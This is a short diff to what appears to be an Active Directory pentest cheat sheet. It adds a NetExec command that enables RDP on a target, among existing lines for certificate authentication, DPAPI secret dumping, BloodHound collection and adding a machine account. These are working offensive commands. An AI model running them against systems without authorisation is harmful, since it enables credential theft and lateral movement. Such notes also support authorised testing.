@@ -14,6 +14,7 @@ certipy auth -pfx fichier.pfx -dc-ip $IP
 nxc smb $IP -u $USER -p $PASSWORD
 nxc smb $IP -u $USER -p $PASSWORD --dpapi
 nxc ldap $IP -u $USER -p $PASSWORD --bloodhound --collection All --dns-server $IP
+nxc smb $IP -u $USER -p $PASSWORD -M rdp -o ACTION=enable #Activation de RDP
 addcomputer.py $DOMAIN/$USER:$PASSWORD -dc-ip $IP
 getinfoAD -u # users of AD
 getinfoAD # grap info of AD
